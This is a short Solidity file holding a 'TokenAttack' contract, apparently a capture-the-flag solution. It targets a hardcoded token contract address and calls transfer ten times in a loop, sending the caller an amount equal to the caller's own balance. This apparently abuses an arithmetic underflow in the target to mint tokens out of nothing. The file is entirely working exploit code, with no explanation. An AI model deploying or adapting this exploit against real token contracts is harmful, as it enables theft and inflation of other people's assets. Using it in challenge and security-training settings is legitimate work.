// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import { Token } from "./Token.sol";

contract TokenAttack {
    function tokenAttack() public {
        Token tokenTarget = Token(address(0x97058602C047Be0E21a85094204b5c9E3Ce76DBB));
        for (uint256 i = 0; i < 10; i++) {
            tokenTarget.transfer(msg.sender, tokenTarget.balanceOf(msg.sender));
        }
    }
}